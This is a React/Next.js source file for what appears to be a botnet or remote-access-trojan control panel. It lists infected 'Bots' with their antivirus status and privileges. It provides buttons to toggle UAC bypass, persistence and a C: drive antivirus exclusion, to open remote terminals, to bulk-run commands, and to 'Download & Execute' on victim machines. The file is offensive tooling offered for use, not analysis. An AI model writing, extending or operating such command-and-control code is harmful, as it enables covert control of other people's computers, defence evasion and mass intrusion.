'use client';
import React, { useState } from 'react';
import TerminalSim from '@/components/TerminalSim';
import { useClientStore, useSocketRealtime } from '@/lib/realtimeStore';
import DataTable from '@/components/DataTable';
import { useTaskStore } from '@/lib/realtimeStore';
import ClientsMap from '@/components/ClientsMap';
import LoadingSkeleton from '@/components/LoadingSkeleton';
import GridListToggle from '@/components/GridListToggle';
import ClientDetailModal from '@/components/ClientDetailModal';
import api from '@/lib/api';
import TaskSchedulerModal from '@/components/TaskSchedulerModal';
import HackerToast, { showHackerToast } from '@/components/HackerToast';

export default function ClientsPage() {
  const tasks = Object.values(useTaskStore((s) => s.tasks) || {});

  // Utility to get the most relevant task status for a client
  function getClientTaskStatus(clientId: string) {
    const clientTasks = tasks.filter((t: any) => t.clientId === clientId);
    if (clientTasks.some((t: any) => t.status === 'running')) return 'running';
    if (clientTasks.some((t: any) => t.status === 'pending')) return 'pending';
    if (clientTasks.some((t: any) => t.status === 'failed' || t.status === 'error')) return 'failed';
    if (clientTasks.some((t: any) => t.status === 'complete' || t.status === 'success')) return 'complete';
    return 'idle';
  }

  // Status badge component (copied from tasks page for reuse)
  function StatusBadge({ status }: { status?: string }) {
    if (!status || status === 'idle') return <span className="inline-block px-2 py-0.5 border font-mono text-xs uppercase tracking-wider bg-gray-800 border-gray-500 text-gray-200 ml-2">IDLE</span>;
    let color = "bg-gray-800 border-gray-500 text-gray-200";
    if (status === "complete" || status === "success") color = "bg-green-900 border-green-500 text-green-200 shadow-[0_0_8px_#0f0]";
    else if (status === "canceled" || status === "failed" || status === "error") color = "bg-red-900 border-red-500 text-red-200 shadow-[0_0_8px_#f00]";
    else if (status === "pending" || status === "running") color = "bg-yellow-900 border-yellow-500 text-yellow-200 shadow-[0_0_8px_#ff0]";
    return (
      <span className={`inline-block px-2 py-0.5 border font-mono text-xs uppercase tracking-wider ${color} ml-2 animate-pulse`} style={{textShadow: '0 0 8px #0f0'}}>{status}</span>
    );
  }
  useSocketRealtime();
  const clients = useClientStore((s) => s.clients);
  const updateClient = useClientStore((s) => s.updateClient);
  const [selectedClient, setSelectedClient] = useState<any | null>(null);
  const [modalOpen, setModalOpen] = useState(false);
  const [terminalOpen, setTerminalOpen] = useState(false);
  const [saving, setSaving] = useState(false);
  const [schedulerOpen, setSchedulerOpen] = useState(false);
  const [search, setSearch] = useState("");
  const [statusFilter, setStatusFilter] = useState("");
  const [tagFilter, setTagFilter] = useState("");
  const [selectedIds, setSelectedIds] = useState<Array<string | number>>([]);
  // Popover state for actions
  const [popoverOpen, setPopoverOpen] = useState<string | null>(null);

  async function handleReboot(client: any) {
    const { default: socket } = await import('@/lib/socket');
    socket.emit('reboot_client', { clientId: client.id });
    showHackerToast(`Reboot command sent to ${client.hostname || client.id}`, 'success');
  }

  async function handleDisconnect(client: any) {
    const { default: socket } = await import('@/lib/socket');
    socket.emit('disconnect_client', { clientId: client.id });
    showHackerToast(`Disconnect command sent to ${client.hostname || client.id}`, 'success');
  }

  if (!clients) return <LoadingSkeleton className="h-32 w-full" />;

  // Bulk Actions Bar
  const handleBulkReboot = async () => {
    const { default: socket } = await import('@/lib/socket');
    for (const id of selectedIds) {
      socket.emit('reboot_client', { clientId: id });
      const client = clients.find((c: any) => c.id === id);
      showHackerToast(`Reboot command sent to ${client?.hostname || id}`, 'success');
    }
  };
  const handleBulkDisconnect = async () => {
    const { default: socket } = await import('@/lib/socket');
    for (const id of selectedIds) {
      socket.emit('disconnect_client', { clientId: id });
      const client = clients.find((c: any) => c.id === id);
      showHackerToast(`Disconnect command sent to ${client?.hostname || id}`, 'success');
    }
  };

  const [bulkTaskModalOpen, setBulkTaskModalOpen] = useState(false);
  const [bulkTaskCommand, setBulkTaskCommand] = useState("");
  const [bulkTaskLoading, setBulkTaskLoading] = useState(false);

  const handleBulkScheduleTask = async () => {
    setBulkTaskLoading(true);
    try {
      const api = (await import('@/lib/api')).default;
      for (const id of selectedIds) {
        await api.post('/tasks', { clientId: id, command: bulkTaskCommand });
        const client = clients.find((c: any) => c.id === id);
        showHackerToast(`Task scheduled for ${client?.hostname || id}`, 'success');
      }
      setBulkTaskModalOpen(false);
      setBulkTaskCommand("");
    } catch (err: any) {
      showHackerToast('Failed to schedule tasks: ' + (err.response?.data?.message || err.message), 'error');
    } finally {
      setBulkTaskLoading(false);
    }
  };

  const BulkActionsBar = () => (
    selectedIds.length > 0 && (
      <div className="flex gap-4 items-center bg-gray-900 border border-blue-800 rounded-lg px-6 py-3 mb-4 shadow">
        <span className="text-blue-300 font-semibold">Bulk Actions for {selectedIds.length} selected</span>
        <button className="px-4 py-2 rounded bg-red-700 hover:bg-red-800 text-white" onClick={handleBulkReboot}>Bulk Reboot</button>
        <button className="px-4 py-2 rounded bg-yellow-700 hover:bg-yellow-800 text-white" onClick={handleBulkDisconnect}>Bulk Disconnect</button>
        <button className="px-4 py-2 rounded bg-blue-700 hover:bg-blue-800 text-white" onClick={() => setBulkTaskModalOpen(true)}>Bulk Schedule Task</button>
      </div>
    )
  );

  const BulkTaskModal = () => (
    bulkTaskModalOpen && (
      <div className="fixed inset-0 z-50 flex items-center justify-center bg-black bg-opacity-70">
        <div className="bg-gray-900 rounded-lg p-6 w-full max-w-md shadow-lg relative">
          <button className="absolute top-2 right-2 text-gray-400 hover:text-white" onClick={() => setBulkTaskModalOpen(false)} aria-label="Close modal">✖️</button>
          <h2 className="text-lg font-bold mb-4 text-blue-300">Bulk Schedule Task</h2>
          <div className="mb-4">
            <label className="block text-sm mb-1">Command to run on {selectedIds.length} clients</label>
            <input className="w-full p-2 rounded bg-gray-800 text-white" value={bulkTaskCommand} onChange={e => setBulkTaskCommand(e.target.value)} placeholder="Enter command..." />
          </div>
          <div className="flex justify-end gap-2">
            <button className="px-4 py-2 rounded bg-gray-700 hover:bg-gray-600" onClick={() => setBulkTaskModalOpen(false)}>Cancel</button>
            <button className="px-4 py-2 rounded bg-blue-600 hover:bg-blue-700 text-white" disabled={bulkTaskLoading || !bulkTaskCommand} onClick={handleBulkScheduleTask}>{bulkTaskLoading ? 'Scheduling...' : 'Schedule Task'}</button>
          </div>
        </div>
      </div>
    )
  );

  // Terminal Modal for selected client
  const renderTerminalModal = () => (
    terminalOpen && selectedClient ? (
      <div className="fixed inset-0 z-50 flex items-center justify-center bg-black bg-opacity-70">
        <div className="bg-gray-900 rounded-lg p-4 w-full max-w-2xl shadow-lg relative">
          <button className="absolute top-2 right-2 text-gray-400 hover:text-white" onClick={() => setTerminalOpen(false)} aria-label="Close terminal">✖️</button>
          <h2 className="text-lg font-bold mb-2 text-blue-300">Remote Terminal: {selectedClient.hostname}</h2>
          <TerminalSim onlyClientId={selectedClient.id} />
        </div>
      </div>
    ) : null
  );

  // Show bulk actions bar if any clients are selected
  const filteredClients = clients.filter((client: any) => {

  // Render Bulk Actions Bar above client table
  // (Assuming you have a table or list render below)
  // Place this in your main return:
  // <BulkActionsBar />

    const matchesSearch =
      search === "" ||
      client.hostname?.toLowerCase().includes(search.toLowerCase()) ||
      client.ip?.toLowerCase().includes(search.toLowerCase());
    const matchesStatus = statusFilter === "" || client.status === statusFilter;
    const matchesTags = tagFilter === "" || (client.tags && client.tags.includes(tagFilter));
    return matchesSearch && matchesStatus && matchesTags;
  });

  const columns = [
    { key: 'taskStatus', label: 'Task Status', sortable: false, render: (row: any) => <StatusBadge status={getClientTaskStatus(row.id)} /> },
    { key: 'privileges', label: 'Privileges', sortable: true, render: (row: any) => String(row.privileges || 'User') },
    { key: 'deviceType', label: 'Device Type', sortable: true, render: (row: any) => String(row.deviceType || 'PC') },
    { key: 'antivirus', label: 'Antivirus', sortable: true, render: (row: any) => String(row.antivirus || 'None') },
    { key: 'uacBypass', label: 'UAC', sortable: true, render: (row: any) => row.uacBypass ? <span className="text-blue-400">✔</span> : <span className="text-gray-500">✗</span> },
    { key: 'persistence', label: 'Persistence', sortable: true, render: (row: any) => row.persistence ? <span className="text-green-400">✔</span> : <span className="text-gray-500">✗</span> },
    { key: 'cExclusion', label: 'C: Exclusion', sortable: true, render: (row: any) => row.cExclusion ? <span className="text-yellow-300">✔</span> : <span className="text-gray-500">✗</span> },
    { key: 'id', label: 'BID', sortable: true, render: (row: any) => String(row.id) },
    { key: 'hostname', label: 'Hostname', sortable: true, render: (row: any) => String(row.hostname) },
    { key: 'ip', label: 'IP', sortable: true, render: (row: any) => String(row.ip) },
    { key: 'status', label: 'Status', sortable: true, render: (row: any) => <span className={row.status === 'online' ? 'text-green-400' : 'text-red-400'}>{String(row.status || 'offline')}</span> },
    { key: 'lastSeen', label: 'Last Seen', sortable: true, render: (row: any) => row.lastSeen ? new Date(row.lastSeen).toLocaleString() : '' },
    {
      key: 'actions',
      label: 'Actions',
      render: (client: any) => {
        return (
          <div className="relative flex gap-2 justify-end items-center">
            {/* Terminal Icon Button */}
            <button
              className="p-1 text-green-400 hover:text-green-200"
              title="Open Terminal"
              onClick={() => {
                if (client.status && client.status.toLowerCase() !== 'online') {
                  showHackerToast(`Client ${client.hostname} is offline. Terminal may not work.`, 'error');
                }
                setSelectedClient(client);
                setTerminalOpen(true);
              }}
              aria-label={`Open terminal for ${client.hostname}`}
            >
              <svg xmlns="http://www.w3.org/2000/svg" className="h-5 w-5" fill="none" viewBox="0 0 24 24" stroke="currentColor">
                <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M15 19l-7-7 7-7" />
              </svg>
            </button>
            {/* Options Popover Button */}
            <button
              className="p-1 text-gray-400 hover:text-blue-400"
              title="Show client options"
              onClick={(e) => { e.stopPropagation(); setPopoverOpen(client.id); }}
              aria-label={`Show options for ${client.hostname}`}
            >
              <svg xmlns="http://www.w3.org/2000/svg" className="h-5 w-5" fill="none" viewBox="0 0 24 24" stroke="currentColor">
                <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M12 6v.01M12 12v.01M12 18v.01" />
              </svg>
            </button>
            {popoverOpen === client.id && (
              <div className="absolute right-0 top-8 z-50 bg-gray-900 border border-gray-700 rounded shadow-lg p-4 w-64" onClick={(e) => e.stopPropagation()}>
                <div className="mb-3">
                  <div className="text-xs text-gray-400 mb-1">Client Stats</div>
                  <div className="text-sm">Uptime: <span className="font-mono">{((Date.now() - (client.connectedAt ? new Date(client.connectedAt).getTime() : Date.now() - 3.4 * 3600 * 1000)) / 3600000).toFixed(1)} hours</span></div>
                  <div className="text-sm">Last seen: <span className="font-mono">{Math.round((Date.now() - (client.lastSeen ? new Date(client.lastSeen).getTime() : Date.now() - 2 * 3600 * 1000)) / 3600000)} hours ago</span></div>
                </div>
                <div className="flex flex-col gap-2">
                  <button className={`w-full text-left px-2 py-1 rounded ${client.uacBypass ? 'bg-blue-900 text-blue-300' : 'hover:bg-gray-800'}`} onClick={async () => {
                    const { default: socket } = await import('@/lib/socket');
                    socket.emit('uac_bypass', { clientId: client.id, enable: !client.uacBypass });
                    showHackerToast(`UAC Bypass ${!client.uacBypass ? 'enabled' : 'disabled'} for ${client.hostname}`, 'success');
                    updateClient({ ...client, uacBypass: !client.uacBypass });
                    setPopoverOpen(null);
                  }}>UAC Bypass {client.uacBypass ? '✔' : ''}</button>
                  <button className={`w-full text-left px-2 py-1 rounded ${client.persistence ? 'bg-green-900 text-green-300' : 'hover:bg-gray-800'}`} onClick={async () => {
                    const { default: socket } = await import('@/lib/socket');
                    socket.emit('set_persistence', { clientId: client.id, enable: !client.persistence });
                    showHackerToast(`Persistence ${!client.persistence ? 'enabled' : 'disabled'} for ${client.hostname}`, 'success');
                    updateClient({ ...client, persistence: !client.persistence });
                    setPopoverOpen(null);
                  }}>Persistence {client.persistence ? '✔' : ''}</button>
                  <button className={`w-full text-left px-2 py-1 rounded ${client.cExclusion ? 'bg-yellow-900 text-yellow-200' : 'hover:bg-gray-800'}`} onClick={async () => {
                    const { default: socket } = await import('@/lib/socket');
                    socket.emit('set_c_exclusion', { clientId: client.id, enable: !client.cExclusion });
                    showHackerToast(`C: Exclusion ${!client.cExclusion ? 'enabled' : 'disabled'} for ${client.hostname}`, 'success');
                    updateClient({ ...client, cExclusion: !client.cExclusion });
                    setPopoverOpen(null);
                  }}>C: Exclusion {client.cExclusion ? '✔' : ''}</button>
                  <button className="w-full text-left px-2 py-1 rounded hover:bg-gray-800 text-yellow-300" onClick={async () => {
                    const { default: socket } = await import('@/lib/socket');
                    socket.emit('update_agent', { clientId: client.id });
                    showHackerToast(`Update Agent command sent to ${client.hostname}`, 'success');
                    updateClient({ ...client, updateAgent: false });
                    setPopoverOpen(null);
                  }}>Update Agent</button>
                  <button className="w-full text-left px-2 py-1 rounded hover:bg-gray-800 text-yellow-400" onClick={() => { handleReboot(client); setPopoverOpen(null); }}>Reboot</button>
                  <button className="w-full text-left px-2 py-1 rounded hover:bg-gray-800 text-red-400" onClick={() => { handleDisconnect(client); setPopoverOpen(null); }}>Disconnect</button>
                </div>
              </div>
            )}
          </div>
        );
      }
    },
  ];

  async function handleSave(updatedClient: any) {
    setSaving(true);
    try {
      const { data } = await api.patch(`/clients/${updatedClient.id}`, updatedClient);
      updateClient(data.data);
      // Emit real-time update
      const socket = (await import('@/lib/socket')).default;
      socket.emit('client_update', data.data);
      setModalOpen(false);
      showHackerToast('Client updated successfully!', 'success');
    } catch (err: any) {
      showHackerToast('Failed to update client: ' + (err.response?.data?.message || err.message), 'error');
    } finally {
      setSaving(false);
    }
  }

  async function handleBulkDelete() {
    try {
      await Promise.all(selectedIds.map(async (id) => {
        await api.delete(`/clients/${id}`);
        const socket = (await import('@/lib/socket')).default;
        socket.emit('client_deleted', id);
      }));
      setSelectedIds([]);
      showHackerToast(`Deleted ${selectedIds.length} clients`, 'error');
    } catch (err: any) {
      showHackerToast('Failed to delete clients: ' + (err.response?.data?.message || err.message), 'error');
    }
  }
  function handleBulkStatus() {
    // TODO: Connect to backend
    showHackerToast(`Changed status for ${selectedIds.length} clients (stub)`, 'info');
    setSelectedIds([]);
  }
  function handleBulkTag() {
    // TODO: Connect to backend
    showHackerToast(`Added tag to ${selectedIds.length} clients (stub)`, 'success');
    setSelectedIds([]);
  }

  return (
    <>
      <HackerToast />
      <BulkActionsBar />
      <BulkTaskModal />
      <div className="p-6 bg-gradient-to-br from-blue-900 via-gray-900 to-gray-950 min-h-screen">
        {/* Command Card */}
        <div className="bg-gradient-to-r from-blue-700 to-blue-900 rounded-lg shadow-lg p-6 mb-8 max-w-4xl mx-auto">
          <h2 className="text-xl font-bold text-white mb-4">Send Command to Bots</h2>
          <form className="flex flex-col md:flex-row gap-4 items-center">
            <select className="w-full md:w-72 p-3 rounded bg-gray-900 text-white text-lg border-2 border-blue-400 focus:outline-none focus:ring-2 focus:ring-blue-500">
              <option>MessageBox</option>
              <option>Execute</option>
              <option>Download & Execute</option>
              <option>Update Agent</option>
              <option>Reboot</option>
              <option>Disconnect</option>
            </select>
            <input type="text" placeholder="Parameters (optional)" className="w-full flex-1 p-3 rounded bg-gray-900 text-white text-lg border-2 border-blue-400 focus:outline-none focus:ring-2 focus:ring-blue-500" />
            <button className="bg-blue-600 hover:bg-blue-700 text-white font-bold px-6 py-2 rounded text-lg shadow" type="button">Send</button>
          </form>
        </div>
        {/* Stats Cards */}
        <div className="mb-6 flex flex-col md:flex-row md:items-center md:justify-between gap-4">
          <h2 className="text-2xl font-bold text-white">Bots</h2>
          <div className="flex gap-2">
            <div className="bg-green-900 text-green-300 px-3 py-1 rounded text-sm">Bots Online <span className="font-bold">{clients.filter((c: any) => c.status?.toLowerCase() === 'online').length}</span></div>
            <div className="bg-red-900 text-red-300 px-3 py-1 rounded text-sm">Bots Offline <span className="font-bold">{clients.filter((c: any) => c.status?.toLowerCase() === 'offline').length}</span></div>
            <div className="bg-yellow-900 text-yellow-200 px-3 py-1 rounded text-sm">Pending Tasks <span className="font-bold">0</span></div>
          </div>
        </div>
        <div className="mb-4 flex flex-col md:flex-row md:items-center md:justify-between gap-2">
          <input
            type="text"
            placeholder="Search hostname or IP..."
            value={search}
            onChange={e => setSearch(e.target.value)}
            className="px-3 py-2 rounded bg-[#232834] text-white border border-[#232834] focus:outline-none md:w-64"
          />
          <select
            value={statusFilter}
            onChange={e => setStatusFilter(e.target.value)}
            className="px-3 py-2 rounded bg-[#232834] text-white border border-[#232834] focus:outline-none md:w-48"
          >
            <option value="">All Statuses</option>
            <option value="online">Online</option>
            <option value="offline">Offline</option>
            <option value="error">Error</option>
          </select>
          <input
            type="text"
            placeholder="Filter by tag..."
            value={tagFilter}
            onChange={e => setTagFilter(e.target.value)}
            className="px-3 py-2 rounded bg-[#232834] text-white border border-[#232834] focus:outline-none md:w-48"
          />
          <button
            className="bg-blue-600 hover:bg-blue-700 text-white px-4 py-2 rounded shadow"
            onClick={() => setSchedulerOpen(true)}
          >+ Ping All</button>
        </div>
      {selectedIds.length > 0 && (
        <div className="mb-4 p-2 bg-gray-800 text-white rounded flex gap-4 items-center border border-gray-700 shadow">
          <span>{selectedIds.length} selected</span>
          <button className="bg-red-700 px-3 py-1 rounded hover:bg-red-800" onClick={handleBulkDelete}>Delete</button>
        </div>
      )}
      {/* Terminal Modal */}
      {selectedClient && terminalOpen && (
        <div className="fixed inset-0 z-50 flex items-center justify-center bg-black bg-opacity-70">
          <div className="bg-gray-900 rounded shadow-lg p-0 w-full max-w-2xl relative">
            <button className="absolute top-2 right-2 text-gray-400 hover:text-white z-10" onClick={() => setTerminalOpen(false)}>&times;</button>
            <h3 className="text-lg font-bold mb-2 text-green-400 px-4 pt-4">Terminal: {selectedClient.hostname || selectedClient.id}</h3>
            <div className="px-4 pb-4">
              <TerminalSim
                prompt={"$ "}
                className="rounded"
                style={{ minHeight: 320 }}
                onlyClientId={selectedClient.id}
                onClose={() => setTerminalOpen(false)}
              />
            </div>
          </div>
        </div>
      )}
      {/* Task Scheduler Modal */}
      <React.Suspense fallback={null}>
        {schedulerOpen && (
          <div className="relative z-10">
            <TaskSchedulerModal
              open={schedulerOpen}
              onClose={() => setSchedulerOpen(false)}
              onSchedule={async (task) => {
                // TODO: connect to backend API
                showHackerToast(`Scheduled command: ${task.command} for clients: ${task.clients.join(", ")} at ${task.scheduleTime || "now"}`, 'success');
              }}
              clientOptions={filteredClients}
              modalClassName="border-2 border-green-500 shadow-[0_0_16px_#0f0]"
            />
          </div>
        )}
      </React.Suspense>
    </div>
  </>
);
}


// Add flicker animation
// In your global CSS (e.g. styles/globals.css), add:
// @keyframes flicker { 0%, 100% { opacity: 1; } 50% { opacity: 0.7; filter: blur(0.5px); } }
// .animate-flicker { animation: flicker 1.2s infinite alternate; }